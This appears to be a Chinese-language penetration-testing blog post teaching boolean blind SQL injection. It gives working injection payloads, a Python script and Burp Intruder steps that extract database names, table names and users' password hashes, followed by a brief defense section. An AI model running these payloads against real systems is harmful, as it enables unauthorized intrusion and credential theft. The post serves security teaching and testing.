---
title: SQL 注入：布尔盲注详解
date: 2024-09-15 08:00:00
tags:
  - Web安全
  - 渗透测试
description: SQL 注入：布尔盲注详解——渗透测试实战笔记，含完整攻击链路与防御方案。
categories: 渗透测试
---

## 什么时候用盲注

布尔盲注适用于：页面不显示查询结果、也不显示数据库报错，但**不同 SQL 逻辑下页面响应会变化**（比如 TRUE 显示"存在"/FALSE 显示"不存在"）。

核心思路：把数据库里的数据转换为 TRUE/FALSE 判断，靠页面差异逐位猜解。

---

## 判断是否存在布尔盲注

```
?id=1 AND 1=1    → 页面正常
?id=1 AND 1=2    → 页面异常（内容消失、404、空白）
```

如果 1=1 正常、1=2 异常，基本确认存在布尔盲注。

---

## 逐位猜解：原理与步骤

### 1. 猜数据库名长度

```sql
?id=1 AND length(database())=5   → 正常 → 库名长度为 5
?id=1 AND length(database())=6   → 异常
```

### 2. 猜数据库名的每个字符

用 `substr(database(),N,1)` 取第 N 个字符，`ascii()` 转 ASCII 码，二分法逼近：

```sql
?id=1 AND ascii(substr(database(),1,1))>100   → 正常 → 第1个字符 > 100
?id=1 AND ascii(substr(database(),1,1))>110   → 异常 → 在 100~110 之间
?id=1 AND ascii(substr(database(),1,1))=115   → 正常 → 第1个字符 = 's'
```

### 3. 猜表名

```sql
?id=1 AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100
```

### 4. 猜数据

```sql
?id=1 AND ascii(substr((SELECT password FROM users LIMIT 0,1),1,1))>50
```

---

## Python 自动化脚本

手动猜一个字符要 5~8 次请求，一个 32 位的 MD5 要猜 32 个字符 = 200+ 次请求。必须脚本化：

```python
import requests

url = "http://target.com/page.php?id=1"
# 猜库名长度
for length in range(1, 30):
    payload = f" AND length(database())={length}"
    r = requests.get(url + payload)
    if "正常页面标志" in r.text:
        print(f"[+] 库名长度: {length}")
        break

# 二分法猜库名
db_name = ""
for pos in range(1, db_len + 1):
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        payload = f" AND ascii(substr(database(),{pos},1))>{mid}"
        r = requests.get(url + payload)
        if "正常标志" in r.text:
            low = mid + 1
        else:
            high = mid
    db_name += chr(low)
    print(f"[+] 第{pos}位: {chr(low)} → {db_name}")

print(f"[+] 库名: {db_name}")
```

---

## Burp Intruder 半自动化盲注

SQLMap 被拦时，用 Burp Intruder 手动盲注：

1. 抓包发送到 Intruder
2. 标记 payload 位置：
   ```
   AND ascii(substr(database(),1,1))=§65§
   ```
3. 用 Numbers 型 payload（32-127）
4. 按响应长度排序——正常响应的那个数字就是正确 ASCII 码

或者用 Cluster Bomb 模式，两个位置分别爆位置(1~30)和字符(32~127)。

---

## 二分法 vs 线性猜解

| 方法 | 每字符请求数 | 说明 |
|------|------------|------|
| 线性 | 平均 48 次 | 从 32 到 127 一个不差 |
| 二分法 | 平均 7 次 | 每次砍半，效率高 6 倍 |
| 按位 OR | 按位 | 用 ascii 位运算更少 |

二分法代码见上文。32 位 MD5 hash 用二分法：32 × 7 = 224 次请求，用线性：32 × 48 = 1536 次。

---

## 实战踩坑

1. **选了不稳定的判断条件** → 用页面长度或特定关键词做判断，不要用"看起来像有内容"这种主观标准
2. **Burp Intruder 把靶机打挂了** → 线程设为 1，延迟 300ms+
3. **substr 0-index vs 1-index** → MySQL `substr` 从 1 开始计数，不是 0
4. **猜完发现是 false/true 反了** → 先确认 `AND 1=1` 和 `AND 1=2` 哪个是"正常"

---

## 防御

参数化查询依然是根本解法。从检测角度：监控单 IP 大量相似请求（`AND ascii(substr(...` 这种规律性 payload）。

---

> 本文仅用于授权安全测试与学习，请勿用于非法用途。
